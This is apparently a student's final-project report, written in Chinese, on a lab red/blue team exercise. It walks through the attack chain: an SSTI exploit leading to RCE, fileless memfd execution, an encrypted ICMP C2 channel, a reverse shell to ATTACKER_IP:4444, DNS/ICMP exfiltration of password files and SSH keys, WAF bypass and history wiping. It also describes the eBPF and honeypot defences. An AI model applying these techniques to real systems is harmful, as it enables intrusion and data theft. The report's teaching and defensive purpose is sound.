# 紅藍對抗攻防演練 — 期末專案報告

## 1. 摘要

這個專案做了一套 Cyberattack Kill Chain 的攻防演練，紅藍雙方各有多個工具跟技術，透過 7 回合的迭代式對抗來展示攻擊跟防禦怎麼互相升級。整個架構分成三個模組：

| 模組 | 元件 | 角色 |
|------|------|------|
| 靶機 | `target_app.py` | 帶有 SSTI 漏洞的 Flask Web 服務 (Port 9999) |
| 靶機 | `honeypot.py` | 假 SSH 蜜罐 (Port 2222)，偵察陷阱 |
| 紅軍 | `red_attacker.py` | SSTI → memfd_create 無檔案執行 + AES-256-CTR ICMP C2 |
| 紅軍 | `red_reverse_shell.py` | TCP 反向 Shell，繞過 eBPF v1 |
| 紅軍 | `exploit.py` | 舊版 WAF bypass 攻擊（備用方案） |
| 紅軍 | `exfil_agent.py` + `exfil_listener.py` | DNS/ICMP 隱蔽通道資料外洩 |
| 紅軍 | `recon.sh`, `ip_switch.sh`, `deploy_agent.sh`, `post_exploit.sh` | 偵察、IP 切換、部署、後滲透腳本 |
| 藍軍 | `blue_ebpf_mdr.py` (v1) | eBPF 偵測：3 hook (memfd_create, execve, socket) |
| 藍軍 | `blue_ebpf_mdr_v2.py` (v2) | eBPF 偵測：6 hook (新增 connect, dup2, dup3) |
| 藍軍 | `blue_mdr_network.py` | 網路 MDR：trap.log 監控 + iptables 自動封鎖 |
| 藍軍 | `soc_dashboard.py` | 即時 SOC 網頁儀表板 (Port 8080) |

這份報告主要在講每個攻擊/防禦動作的 **underlying principles**、**目的** 跟 **對系統的影響**，也會說明從單一防禦到多層縱深防禦的演進。

---

## 2. 環境架構

```
┌──────────────────────────┐              ┌──────────────────────────────┐
│  Attacker (WSL2 筆電)     │              │  Target Machine (Lab 機器)    │
│                          │              │                              │
│  red_attacker.py         │    ICMP      │  target_app.py  (Flask :9999)│
│  (SSTI + memfd + C2)     │◄════════════►│  honeypot.py    (SSH  :2222) │
│                          │              │                              │
│  red_reverse_shell.py    │    TCP       │  blue_ebpf_mdr.py    (v1)   │
│  (TCP Reverse Shell)     │◄────────────►│  blue_ebpf_mdr_v2.py (v2)   │
│                          │              │  blue_mdr_network.py         │
│  exfil_listener.py       │   DNS/ICMP   │  soc_dashboard.py   (:8080) │
│  (資料外洩接收器)          │◄────────────│                              │
│                          │              │                              │
│  recon.sh, ip_switch.sh  │              │                              │
│  exploit.py, deploy_agent│              │                              │
└──────────────────────────┘              └──────────────────────────────┘
```

- **攻擊機**: WSL2 Linux (Ubuntu 22.04)，紅隊工具不需要 eBPF 支援
- **靶機/防禦機**: Lab 機器 (Ubuntu 24.04 原生)，跑靶機服務跟全部藍隊防禦
- **通訊協議**: ICMP Echo Request（主要 C2）、TCP（反向 Shell）、DNS/ICMP（資料外洩）

### 2.1 雙層防禦架構

```
┌─────────────────────────────────────────────────────┐
│  第一層 — 網路層（網路欺敵）                          │
│  honeypot.py（Port 2222）→ trap.log →               │
│  blue_mdr_network.py → iptables DROP                │
│  偵測：偵察行為，封鎖已知惡意 IP                       │
├─────────────────────────────────────────────────────┤
│  第二層 — 核心層（eBPF 行為偵測）                     │
│  v1: memfd_create + execve + 原始 ICMP socket        │
│  v2: + connect（可疑埠）+ dup2/dup3（Shell 偵測）     │
│  偵測：惡意行為，不管來源 IP 是什麼                     │
├─────────────────────────────────────────────────────┤
│  可視化 — SOC 儀表板（Port 8080）                    │
│  即時網頁 UI 聚合所有防禦事件                         │
└─────────────────────────────────────────────────────┘
```

| 層級 | 機制 | 防護範圍 | 限制 |
|------|------|----------|------|
| 網路層 | 蜜罐 + iptables 自動封鎖 | 封鎖已知惡意 IP | 攻擊者可以換 IP 繞過 |
| 核心層 | eBPF 系統呼叫 hook + bpf_send_signal | 封鎖惡意行為，跟來源 IP 無關 | 要先知道該 monitor 哪些 syscall |

---

## 3. Kill Chain 各階段分析

### Phase 1: 偵察 (Reconnaissance)

**工具**: `recon.sh` (nmap 自動化偵察)

**動作**: 掃描目標機器的 open port 跟 service version。

```bash
bash red_team/recon.sh <TARGET_IP>
# 或手動跑
nmap -p 2000-10000 -sV <TARGET_IP>
```

**原理**: Web 應用偵察的重點在於搞清楚 application 的 **attack surface**。nmap 的 `-sV` flag 會去連每個 open port 並分析回應的 banner 來辨識 service 類型。

**掃描結果**:
- Port 2222: SSH banner (OpenSSH 8.9p1) — 其實是蜜罐
- Port 9999: Diagnostic API — 真正的目標 (Flask SSTI 漏洞)

**影響**: 確認了攻擊向量，但如果不小心連到 Port 2222，就會觸發蜜罐 → 網路 MDR → IP 被封。

#### 1.1 蜜罐陷阱與 IP 封鎖

**元件**: `honeypot.py` + `blue_mdr_network.py`

蜜罐在 Port 2222 模擬 OpenSSH server，送一個符合 RFC 4253 的 SSH version banner：

```
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n
```

這個 banner 足以騙過 nmap 的 `-sV` 偵測。任何連進來的 connection 都會被記到 `trap.log`（時間戳、來源 IP、Port、client 資料）。網路 MDR 會 polling `trap.log`，發現新 IP 就馬上執行：

```bash
iptables -I INPUT 1 -s <attacker_ip> -j DROP
```

Rule 插在 INPUT chain 的 position 1（最高優先），確保比任何現有的 ACCEPT rule 都先被 match，直接把攻擊者的所有流量擋掉。

**零 false positive**: 蜜罐本來就沒有跑任何合法服務，所以只要有連線進來就代表有問題。

#### 1.2 IP 切換繞過 (ip_switch.sh)

**原理**: 基於 IP 的封鎖可以用 IP alias 繞過。紅隊用 `ip_switch.sh` 在 WSL2 的 network interface 上掛一個新的 IP：

| IP | 用途 | 結果 |
|----|------|------|
| 主 IP | 觸發蜜罐 Port 2222 | 被 MDR 封掉 |
| 備用 IP (alias) | 打 Port 9999 | 沒被封 |

**影響**: 這邊可以看到網路層防禦天生的限制 — 攻擊者只要換個 source IP 就繞過去了。這也是為什麼我們後面需要核心層的 eBPF 行為偵測。

---

### Phase 2: 武器化 (Weaponization)

**工具**: `red_attacker.py`

**動作**: 組合 SSTI Payload + memfd_create 無檔案 loader + AES-256-CTR 加密 ICMP C2 Agent。

#### 2.1 SSTI (Server-Side Template Injection) 原理

Flask 用 Jinja2 當 template engine，Jinja2 會在 `{{ }}` 裡面執行 Python expression。

**漏洞成因 — 兩步合成的錯誤** (CWE-1336 / CWE-94):

```python
# Step 1: 用 Python f-string 把 user input 直接塞進 template source
template = f"<pre>Query: {user_input}</pre>"
# 假設 user_input = "{{ 7*7 }}"，結果字串變成 "<pre>Query: {{ 7*7 }}</pre>"

# Step 2: Jinja2 把 {{ 7*7 }} 當成 expression 去 evaluate → 49
render_template_string(template)
```

**安全的寫法**是用 data binding，不是直接串 source code:
```python
render_template_string("Query: {{ q }}", q=user_input)
# Jinja2 把 q 當成「資料」，不會去執行
```

**SSTI → RCE escalation path**:

Jinja2 expression 可以沿著 Python 的 object model 一路走：

```
config                           → Flask config 物件
  .__class__                     → <class 'flask.config.Config'>
  .__init__                      → Config 的 constructor
  .__globals__                   → flask/config.py 模組的 global namespace
  ['os']                         → os 模組 (因為 flask.config 有 import os)
  .popen('cmd')                  → subprocess → RCE
```

**為什麼這條路走得通**:
1. Python 的 **introspection** 機制讓任何物件都能回溯到它的 class，再拿到所在模組的 global namespace
2. Flask 的 `config.py` 在 top level 有 `import os`，所以 `os` 會出現在 `Config.__init__.__globals__` 裡
3. Jinja2 sandbox 預設只擋以 `_` 開頭的 attribute access，但 `config.__class__` 這條 chain 中間跳板的 attribute 不是 `_` 開頭的

**影響**: 拿到跟 Flask process 同等權限的 RCE。

#### 2.2 memfd_create 無檔案執行原理

**問題**: 傳統惡意程式會寫到 disk 上（像 `/tmp/backdoor`），這樣會留下檔案痕跡，觸發 inotify/fanotify monitoring，也會被 AV/EDR 掃到。

**解法**: Linux `memfd_create(2)` syscall (syscall 319, x86_64, Linux >= 3.17)。

**核心機制**:

```
memfd_create(name, flags) → fd
```

1. 在 kernel 的 **tmpfs 層**建一個 **anonymous file**
2. 回傳一個 fd，用起來跟一般 file 一樣
3. **不會 link 到任何目錄** — 在 filesystem 上完全看不到
4. 內容存在 **page cache**（就是 RAM），不會寫到 block device
5. 可以透過 `/proc/<pid>/fd/<N>` 來 access 這個 fd，讓 `execve()` 去執行

**攻擊鏈**:

```
fd = syscall(319, "", 0)          # 在 RAM 裡建一個 anonymous fd
os.write(fd, agent_code)           # 把 C2 agent 寫進去 (還是在 RAM)
os.fork()                          # fork：parent 回去讓 Flask 回 response
  ├── parent: exits                # popen() 結束，HTTP response 正常回
  └── child: execve(python3,       # 從 memfd 執行 agent
        /proc/<pid>/fd/<N>)        # kernel 解析路徑 → 讀 memfd → 跑起來
```

**為什麼 `/proc/<pid>/fd/N` 能拿來 execve**:
- `procfs` 是 virtual filesystem，每個 fd entry 是指向 kernel `struct file` 的 symlink
- `execve()` 會 resolve symlink，找到 anonymous inode，讀 memfd 內容來載入
- `fork()` 會複製 fd table，child 的 fd 副本獨立有效，就算 parent 退出了也沒差

**為什麼要 fork()**:
- SSTI 的 `popen()` subprocess 必須快點結束，Flask 才能把 HTTP response 回給 client
- `fork()` 之後 parent 馬上退出，child 變 orphan process 被重新掛到 PID 1
- child 的 memfd fd 還是有效的（因為 fork 有複製 fd table）

**影響**: disk 上完全沒有任何檔案。所有 file-based 的 AV/EDR 偵測都失效。

#### 2.3 雙層 Base64 編碼

Payload 用了兩層 base64 encoding 來避免跳脫字元的問題:

```
[Agent Python 程式碼]
    → base64 編碼 → agent_b64
        → 嵌入 Loader Python 腳本
            → base64 編碼 → loader_b64
                → 嵌入 SSTI 字串: echo loader_b64 | base64 -d | python3
                    → URL 編碼 → curl -d "query=..."
```

**為什麼要兩層不能只用一層**: SSTI 字串裡面用單引號包 shell command，如果 loader 腳本本身有引號就會把 SSTI 語法弄壞。Base64 只有 `A-Za-z0-9+/=`，在 shell 跟 Jinja2 裡面都是安全字元。

#### 2.4 AES-256-CTR 加密

**為什麼從 XOR 升級到 AES-256-CTR**:

我們的 C2 加密從早期的 XOR stream cipher 升級成 AES-256-CTR（counter mode），強度拉到業界標準。

| 特性 | XOR（原始版本） | AES-256-CTR（目前版本） |
|------|----------------|----------------------|
| 演算法 | XOR stream cipher | AES-256 counter mode (NIST SP 800-38A) |
| Key derivation | 固定 16 byte 明文 key | SHA-256(shared_secret) → 32 bytes |
| IV/Nonce | 沒有 | 每個封包隨機 16 byte IV (os.urandom(16)) |
| Known-plaintext resistance | 很容易破（知道任一 byte 的明文就能還原對應 key byte） | 計算上不可行 |
| 頻率分析抵抗性 | 弱（沒 IV → 同樣明文 = 同樣密文） | 安全（random IV → 同樣明文 ≠ 同樣密文） |
| 實作方式 | 純 Python | ctypes + OpenSSL libcrypto |
| 依賴 | 無 | 系統的 libcrypto（Linux 預裝，不用 pip install） |

**AES-256-CTR 怎麼運作**:

CTR mode 其實是當 stream cipher 用：拿 AES-256 去加密連續的 counter value 來產生 keystream，再跟 plaintext XOR：

```
金鑰流 = AES-256-Encrypt(key, IV || counter_0) ||
         AES-256-Encrypt(key, IV || counter_1) || ...
密文 = 明文 ⊕ 金鑰流
```

- **Semantic security**: 每個封包用 random IV，同樣的明文會產生不同密文，防止 pattern analysis
- **不用 padding**: CTR mode 產生的 ciphertext 跟 plaintext 等長，很適合有 size 限制的 ICMP
- **零 pip 依賴**: 直接用 Python ctypes 呼叫系統的 OpenSSL libcrypto

**Key derivation**: `AES_KEY = SHA-256(SHARED_SECRET)` → 32 bytes
**每個封包**: `IV = os.urandom(16)`，prepend 在 ciphertext 前面

**這次升級帶出兩個重點**:
1. 現實中的 malware 越來越常用強加密
2. **行為偵測（eBPF）不管加密多強都一樣有用**，因為它看的是 syscall pattern，不是 payload 內容

---

### Phase 3: 投遞 (Delivery)

**動作**: 透過 HTTP POST 把 SSTI payload 送到 `/diag` endpoint。

```bash
curl -s -X POST http://TARGET:9999/diag -d "query=SSTI_PAYLOAD"
```

**原理**: HTTP POST body 裡的 `query=` 參數經 URL decode 後會變成 Jinja2 template source 的一部分。Flask 的 `request.form.get('query')` 自動做 URL decode，把完整的 `{{ }}` expression 還原出來。

**影響**: 在靶機上觸發 SSTI → RCE → memfd_create → fork+execve → 記憶體駐留的 agent 就跑起來了。

---

### Phase 4: 利用與安裝 (Exploitation & Installation)

**動作**: 建立 AES-256-CTR 加密的 ICMP covert C2 channel。

#### 4.1 ICMP 隱蔽通道原理

ICMP (Internet Control Message Protocol, RFC 792) 是 Layer 3 的協定，本來是拿來做網路診斷用的。

**為什麼 ICMP 很適合拿來做 covert channel**:
1. 防火牆通常**預設會放行 ICMP**（擋掉的話 ping 跟 traceroute 都不能用）
2. ICMP Echo Request/Reply 的 **data field 長度沒有限制** — 協定本身不管 payload 裡面放什麼
3. 大部分 IDS/IPS 只檢查 TCP/UDP 的 port 跟 payload，ICMP payload 基本上就當作 opaque 的診斷資料
4. ICMP **沒有 port number** → 沒有 connection state → 更難追蹤

**Linux Raw Socket 的行為**:
```python
socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)  # 需要 root 或 CAP_NET_RAW
```
- Kernel 會把每個進來的 ICMP 封包**複製一份**丟給 raw socket
- Kernel **同時**也會自動回 echo reply
- 我們用 ICMP ID 欄位 (0x1337) 加 type (8 = echo request) 來過濾出 C2 traffic

**Protocol 設計**:

```
┌─────────────────────────────────────────────────────┐
│ IP Header (20B) │ ICMP Header (8B) │ Payload        │
│                 │ type=8 code=0    │ ┌─────────────┐│
│                 │ checksum         │ │ MAGIC  (1B) ││
│                 │ ID=0x1337        │ │ MSG_TYPE(1B)││
│                 │ SEQ              │ │ AES-256-CTR ││
│                 │                  │ │ encrypted   ││
│                 │                  │ │ data        ││
│                 │                  │ └─────────────┘│
└─────────────────────────────────────────────────────┘

MSG_TYPE:
  0x01 = Heartbeat (Agent → C2)
  0x02 = Command   (C2 → Agent)
  0x03 = Result    (Agent → C2, chunked)
```

**加密封包格式**: 每個封包的 payload 長這樣 `MAGIC + MSG_TYPE + IV(16B) + AES-CTR-ciphertext`。接收方讀 IV 之後用 shared key 解密。

#### 4.2 ICMP Checksum (RFC 1071)

```
1. 把封包當成一串 16-bit big-endian integer
2. 做 ones' complement 加法（carry 要 wrap around）
3. 取最終結果的 ones' complement (bitwise NOT)
```

接收端對整個封包（含 checksum field）做一樣的運算，如果結果是 `0xFFFF` 就代表封包沒問題。

---

### Phase 5: C2 命令與控制 (Command & Control)

**動作**: Agent 定期送 heartbeat，接收並執行 C2 command。

**Agent 執行流程**:
1. 初始 heartbeat: 送 hostname、UID、kernel version
2. 每 30 秒重複送 heartbeat
3. 收到 MSG_COMMAND → `subprocess.run(cmd, shell=True)` 執行
4. 把 output 切成 480 byte 的 chunk → 逐一用 AES-256-CTR 加密送回去
5. 收到 `__exit__` → 關 socket 然後結束

**Timing Jitter**:
```python
time.sleep(random.uniform(1.0, 2.5))  # 主迴圈每輪隨機等 1~2.5 秒
time.sleep(0.05)                       # chunk 之間 50ms delay
```
加了 random delay 可以讓 traffic pattern analysis（像是週期性 beacon detection）更難做。

**影響**: 攻擊者拿到完整的 remote shell，通訊藏在 ICMP traffic 裡面還有 AES-256-CTR 加密。

---

### Phase 5b: TCP 反向 Shell — 繞過 eBPF v1 (Evasion)

**工具**: `red_reverse_shell.py`

**背景**: 藍軍已經部署了 eBPF v1 (`blue_ebpf_mdr.py --kill`)，成功擋住了 memfd_create 攻擊。紅隊需要想其他辦法。

**繞過原理**: 看 eBPF v1 的三個 hook 以及紅隊怎麼對付:

| eBPF v1 Hook | 反向 Shell 會不會觸發 | 原因 |
|--------------|-------------------|--------|
| `memfd_create` | 不會 | 沒用 memfd，直接 fork |
| `execve /proc/fd` | 不會 | 沒從 /proc/fd 執行，直接 `pty.spawn("/bin/bash")` |
| `socket(SOCK_RAW)` | 不會 | 用的是 SOCK_STREAM (一般 TCP)，不是 SOCK_RAW |

**攻擊鏈**:

```
SSTI → os.popen → base64 -d → python3 → fork()
  └→ child: socket(AF_INET, SOCK_STREAM, 0)
       → connect(ATTACKER_IP:4444)  # 一般的 TCP outbound
       → dup2(sock, 0)              # stdin 導到 socket
       → dup2(sock, 1)              # stdout 導到 socket
       → dup2(sock, 2)              # stderr 導到 socket
       → pty.spawn("/bin/bash")     # interactive shell
```

**跟 ICMP C2 的差別**:
- 不用 sudo（TCP socket 不需要 root，ICMP raw socket 才要）
- 不用 memfd_create（沒有無檔案載入那個步驟）
- 全部都是合法的 syscall，eBPF v1 完全偵測不到

**影響**: 就算藍軍開了 eBPF v1 防禦，紅隊還是可以拿到完整的 interactive shell。

---

### Phase 5c: 資料外洩 (Exfiltration)

**工具**: `exfil_agent.py`（靶機端）+ `exfil_listener.py`（攻擊機端）+ `deploy_agent.sh`（部署腳本）

**動作**: 在已經打進去的靶機上蒐集敏感資料，透過 covert channel 傳回攻擊機。

#### 外洩目標

Agent 會自動蒐集這些東西:
- `/etc/passwd` — 使用者帳號列表
- SSH key — 可以拿來做 lateral movement
- Bash history — 可能有密碼或敏感指令
- 應用程式 source code — 業務邏輯跟 secret

#### 雙通道傳輸

Agent 有自動偵測功能，優先走 DNS channel，DNS 不通的話自動切到 ICMP:

**DNS 通道**:
- 資料 Base32 encode 之後塞在 DNS query 的 subdomain label 裡
- 格式: `<encoded_data>.x.exfil.local`
- 攻擊端的假 DNS server (`exfil_listener.py`) 負責把 fragment 組回來

**ICMP 通道**:
- 資料 hex encode 後塞在 ICMP echo request 的 padding pattern 裡
- 透過 `ping -p` 來送

**兩個通道的共同特性**:
- 有序號的分塊傳輸
- 校驗碼做 integrity check
- 封包之間加 random delay（DNS: 0.1-0.5s, ICMP: 0.2-0.8s）避免被 pattern detection 抓到
- Agent 傳完後自動把自己刪掉

---

### Phase 6: 後滲透與清除 (Post-Exploitation & Cleanup)

**工具**: `post_exploit.sh`

在 C2 shell 或反向 shell 裡面跑情報蒐集:

```
whoami && id        → 確認身份跟群組
uname -a            → OS 跟 kernel version
cat /etc/passwd     → 使用者列表
ls -la /home/       → home directory 偵察
env                 → 環境變數（可能有 secret）
```

清除痕跡:
```bash
history -c          → 清掉 command history
```

---

### 備用攻擊: WAF Bypass (exploit.py)

**工具**: `exploit.py` — 舊版 WAF bypass

**原理**: 如果目標有基本的 WAF 在擋空格、`bash`、`nc`、`sh`、`/dev/tcp` 之類的 keyword，可以用以下方式繞:
- `${IFS}` 取代空格（IFS = Internal Field Separator，Bash 預設就有空格）
- Base64 encode 繞過 keyword detection
- Backslash 混淆

這個工具是備用方案，主攻擊（`red_attacker.py`）不能用的時候才拿出來。

---

## 4. 藍軍防禦分析

### 4.1 eBPF 架構原理

**eBPF (extended Berkeley Packet Filter)** 是 Linux kernel 裡面的可程式化 VM，可以在**不改 kernel source code** 的情況下在 kernel space 跑自訂邏輯。

**執行流程**:
```
C source → Clang/LLVM compile → eBPF bytecode → Kernel Verifier 驗證
  → JIT 成 x86_64 native code → attach 到 Tracepoint → 零開銷即時執行
```

**安全保證 (Verifier 強制的規則)**:
- 不能有 unbounded loop（一定要能證明會結束）
- 不能 out-of-bounds memory access
- 不能任意 dereference pointer
- Stack 限制 512 bytes
- → **eBPF 程式不可能把 kernel 搞掛**

### 4.2 Tracepoint vs Kprobe

| 特性 | Tracepoint | Kprobe |
|------|-----------|--------|
| 類型 | Static（compile 進 kernel） | Dynamic（runtime inject） |
| 穩定性 | 跨版本 ABI stable | function signature 可能會變 |
| 觸發時機 | Syscall enter/exit | 任意 kernel function |
| 適用場景 | Syscall 監控 | 深層 kernel debugging |

我們選 **Tracepoint** 的原因:
1. `sys_enter_*` 在 syscall **執行之前**就會觸發 → 可以搶先 kill 掉
2. 跨 kernel 5.x–6.x 都穩定
3. BCC 有 `TRACEPOINT_PROBE()` macro 可以用，寫起來方便

### 4.3 `bpf_send_signal(SIGKILL)` 機制

這是 Linux 5.3+ 才有的 BPF helper，可以從 kernel space 直接送 signal。

**為什麼比在 userspace 呼叫 kill() 更好**:

```
eBPF 路徑 (bpf_send_signal):
  syscall enter → tracepoint 觸發 → eBPF 跑 →
  → bpf_send_signal(9) → process 被殺 (syscall 根本還沒跑完)
  延遲: < 1 微秒

Userspace 路徑 (kill()):
  syscall enter → tracepoint 觸發 → eBPF 送 perf event →
  → Python 讀到 event → Python 呼叫 os.kill() → kernel 送 signal
  延遲: 好幾毫秒 (這段時間 malware 可能已經做完事了)
```

**重點**: 用 `bpf_send_signal` 的話，process 在 `memfd_create` syscall **都還沒真正執行**的時候就被殺了。攻擊鏈在第一步就斷掉。

### 4.4 eBPF v1 — 三個 Hook (blue_ebpf_mdr.py)

| Hook | Syscall | 偵測邏輯 | 嚴重度 |
|------|---------|---------|--------|
| Hook 1 | `memfd_create(319)` | 只要有呼叫就記 PID + 發警報 | HIGH |
| Hook 2 | `execve` | 路徑 match `/proc/*/fd/*` → 確認無檔案執行 | CRITICAL |
| Hook 3 | `socket` | AF_INET + SOCK_RAW + ICMP + PID 之前有呼叫過 memfd → 確認 C2 | CRITICAL |

**關聯偵測 (Correlation)**:
- 只有 memfd_create → HIGH（可能是合法用途，像 Chrome IPC）
- 只有 raw ICMP socket → ALERT（可能只是 ping）
- memfd_create **加上** raw ICMP socket → **CRITICAL + CORRELATED**（幾乎確定是無檔案 C2）

**冷啟動偵測**: 啟動時會掃 `/proc/*/exe`，檢查有沒有已經在跑的 memfd process，這樣就算 eBPF 還沒載入之前就已經植入的 malware 也能被抓到。

**v1 的限制**: 只能偵測用 memfd_create + ICMP raw socket 的攻擊。一般的 TCP 反向 Shell（fork → connect → dup2 → pty.spawn）三個 hook 全部都不會觸發。

### 4.5 eBPF v2 — 六個 Hook (blue_ebpf_mdr_v2.py)

保留 v1 的 3 個 hook，再加 3 個來偵測反向 Shell:

| Hook | Syscall | 偵測邏輯 | 嚴重度 |
|------|---------|---------|--------|
| Hook 1-3 | (跟 v1 一樣) | (跟 v1 一樣) | HIGH/CRITICAL |
| Hook 4 | `sys_enter_connect` | 檢查 destination port 有沒有在可疑 port list 裡（預設: 4444, 4445, 5555, 1234, 1337） | HIGH |
| Hook 5 | `sys_enter_dup2` | 用 bitmask 追蹤每個 PID；fd 0, 1, 2 全部被 redirect → 確認反向 Shell | CRITICAL |
| Hook 6 | `sys_enter_dup3` | 跟 Hook 5 一樣，cover Python `os.dup2(fd, fd2, inheritable=False)` 的 code path | CRITICAL |

**偵測反向 Shell 的兩個策略**:

**策略 1 — 可疑 Port 偵測 (Hook 4)**:
- Monitor `connect()` call，如果 destination port match 已知的 C2/Shell port（4444 之類的），馬上發 alert 並且可以直接 kill
- 在 connection 建立的當下就偵測到

**策略 2 — 行為模式偵測 (Hook 5+6)**:
- 追蹤每個 PID 的 `dup2()`/`dup3()` call
- 用 bitmask 紀錄: `dup2(fd, 0)` → bit 0, `dup2(fd, 1)` → bit 1, `dup2(fd, 2)` → bit 2
- 同一個 process 的 stdin(0), stdout(1), stderr(2) **三個 fd 都被 redirect** 的話就觸發 CRITICAL alert
- **不靠 port number**: 就算反向 Shell 走 80 或 443，行為偵測一樣能抓到

**為什麼 dup2 跟 dup3 都要 hook**: Python 的 `os.dup2(fd, fd2, inheritable=False)` 底層呼叫的其實是 `dup3()` 不是 `dup2()`，所以兩個都要 monitor 才不會漏掉。

### 4.6 網路 MDR (blue_mdr_network.py)

| 功能 | 說明 |
|------|------|
| 觸發來源 | `trap.log`（蜜罐日誌） |
| 封鎖方式 | `iptables -I INPUT 1 -s <IP> -j DROP` |
| 監控方式 | Polling `trap.log` 看有沒有新 IP |
| Rule 位置 | INPUT chain position 1（最高優先） |
| 清理功能 | `--cleanup` 退出時移除所有 rule |
| SOC 整合 | `--soc-log` 寫入 `soc_events.jsonl` |

**跟 eBPF 的搭配**:
- 網路 MDR 封鎖**已知的壞人**（根據偵察行為判斷）
- eBPF 封鎖**壞的行為**（看 syscall pattern，不管 IP 是什麼）
- 兩個搭在一起: 已知壞人 + 壞的行為 = 多層防護

### 4.7 SOC 儀表板 (soc_dashboard.py)

Flask-based 的即時 SOC 網頁 (Port 8080)，把所有防禦元件的事件集中起來看。

**功能**:
- **Server-Sent Events (SSE)**: 即時 push 到瀏覽器，不用 polling
- **多來源攝取**: 讀 `trap.log`（蜜罐事件）跟 `soc_events.jsonl`（eBPF alert、iptables 封鎖）
- **HTTP POST API** (`/api/event`): 可以 programmatically 送事件進來
- **統計卡片**: 事件總數、封鎖 IP 數、process kill 數、嚴重 alert 數
- **嚴重度顏色**: CRITICAL（紅）、HIGH（黃）、MEDIUM（藍）、INFO（灰）
- **暗色主題的 SOC console UI**: 事件 timeline 自動捲動

**資料流**:
```
honeypot.py → trap.log ──────────────────────┐
blue_ebpf_mdr*.py → soc_events.jsonl ────────┤
blue_mdr_network.py → soc_events.jsonl ──────┤
                                              ▼
                                    soc_dashboard.py → 瀏覽器 (SSE)
```

SOC 儀表板把所有防禦元件的事件整合在一起，讓藍隊可以看到整體的攻擊狀況，而不是只看到零散的 alert。

### 4.8 eBPF 資料結構

**BPF_PERF_OUTPUT (Perf Ring Buffer)**:
- Kernel 跟 userspace 之間的 **lock-free ring buffer**
- Kernel 寫事件進去，Python 把事件讀出來
- 透過 mmap 共享記憶體，zero-copy

**BPF_HASH (Hash Map)**:
- Kernel 跟 userspace 共用的 hash table
- `memfd_pids`: 記錄哪些 PID 呼叫過 memfd_create（用來做 correlation）
- `dup_mask`: 記錄每個 PID 的 fd redirect bitmask（v2 新增，偵測反向 Shell 用）
- `whitelist`: Userspace 寫 whitelist PID 進去，kernel 讀出來判斷要不要跳過

---

## 5. 7 回合迭代式對抗演練

這個專案最有意思的部分是把 demo 設計成 7 回合的對抗，呈現資安攻防是一個不斷迭代的過程：

| 回合 | 角色 | 行動 | 使用工具 | 結果 |
|------|------|------|---------|------|
| 1 | 紅隊 | 偵察（nmap 掃描） | `recon.sh` | 發現 Port 2222 (SSH) 和 Port 9999 (API) |
| 1b | 紅→藍 | 碰到蜜罐 (Port 2222) | `honeypot.py` + `blue_mdr_network.py` | 紅隊 IP 被 iptables 封掉 |
| 1c | 紅隊 | IP alias 繞過封鎖 | `ip_switch.sh` | 重新取得網路存取 |
| 2 | 紅隊 | SSTI + 無檔案 ICMP C2 | `red_attacker.py` + `target_app.py` | 拿到完整的 remote control（AES-256-CTR 加密） |
| 3 | 藍隊 | 部署 eBPF v1 | `blue_ebpf_mdr.py --kill` | 冷啟動掃描清掉現有 agent |
| 4 | 紅隊 | 再打一次 SSTI + memfd | `red_attacker.py` | **被 eBPF v1 擋住**，memfd_create 觸發 SIGKILL |
| 5 | 紅隊 | TCP 反向 Shell（繞過 v1） | `red_reverse_shell.py` | **繞過 eBPF v1**，拿到 interactive shell |
| 6 | 藍隊 | 升級到 eBPF v2 | `blue_ebpf_mdr_v2.py --kill` | 偵測到 connect() 可疑 port + dup2 fd hijack，**終止反向 Shell** |
| 7 | 展示 | SOC 儀表板 | `soc_dashboard.py` | 整個攻防過程的即時可視化 |

**每回合學到的東西**:

1. **回合 1-1c**: 網路層防禦（蜜罐 + 防火牆）有用但可以繞
2. **回合 2**: 無檔案攻擊加上 covert channel 可以躲過傳統偵測
3. **回合 3-4**: eBPF kernel-level 偵測可以擋住已知的攻擊 pattern
4. **回合 5**: 攻擊者會 adapt，換一組 syscall 就繞過偵測了
5. **回合 6**: 防禦者也得跟著進化，擴大偵測範圍
6. **回合 7**: 統一的 visibility 對 security operation 很重要

---

## 6. MITRE ATT&CK 映射

### 紅軍攻擊技術

| ID | 技術名稱 | 本專案實作 | 對應工具 |
|----|---------|-----------|---------|
| T1595 | Active Scanning | nmap port scan + service detection | `recon.sh` |
| T1190 | Exploit Public-Facing Application | SSTI 注入 Flask `/diag` | `target_app.py` |
| T1059.006 | Command & Scripting: Python | memfd_create loader + agent + 反向 Shell | `red_attacker.py`, `red_reverse_shell.py` |
| T1620 | Reflective Code Loading | memfd_create → execve from /proc/fd | `red_attacker.py` |
| T1027 | Obfuscated Files or Information | 雙層 Base64 + AES-256-CTR encryption | `red_attacker.py` |
| T1140 | Deobfuscate/Decode | base64 -d pipeline | `red_attacker.py` |
| T1095 | Non-Application Layer Protocol | ICMP echo request C2 channel (AES-256-CTR) | `red_attacker.py` |
| T1571 | Non-Standard Port | C2 跟反向 Shell 用 port 4444 | `red_reverse_shell.py` |
| T1053.003 | Scheduled Task: Cron | crontab 持久化反向 Shell | post-exploitation |
| T1082 | System Information Discovery | whoami, uname -a, id | `post_exploit.sh` |
| T1005 | Data from Local System | 蒐集敏感資料 (/etc/passwd, SSH keys) | `exfil_agent.py` |
| T1048.003 | Exfil Over Alternative Protocol | DNS/ICMP covert channel exfiltration | `exfil_agent.py`, `exfil_listener.py` |
| T1070.003 | Clear Command History | `history -c` 清痕跡 | post-exploitation |
| T1070.004 | File Deletion | exfil_agent 傳完自動刪除 | `exfil_agent.py` |

### 藍軍偵測覆蓋

| ID | 偵測面 | Hook / 機制 | 版本 | 對應工具 |
|----|--------|------------|------|---------|
| T1595 | Active Scanning | 蜜罐連線偵測 | - | `honeypot.py` + `blue_mdr_network.py` |
| T1620 | Reflective Code Loading | `sys_enter_memfd_create` | v1 | `blue_ebpf_mdr.py` |
| T1059 | Command Execution from /proc/fd | `sys_enter_execve` | v1 | `blue_ebpf_mdr.py` |
| T1095 | Non-App Layer Protocol | `sys_enter_socket` (RAW ICMP) | v1 | `blue_ebpf_mdr.py` |
| T1571 | Non-Standard Port Connect | `sys_enter_connect` | v2 | `blue_ebpf_mdr_v2.py` |
| T1059.006 | Reverse Shell fd Hijack | `sys_enter_dup2` / `sys_enter_dup3` | v2 | `blue_ebpf_mdr_v2.py` |
| T1070 | Indicator Removal | `/proc/*/exe` 冷啟動掃描 memfd process | v1/v2 | `blue_ebpf_mdr*.py` |

---

## 7. 安全考量與限制

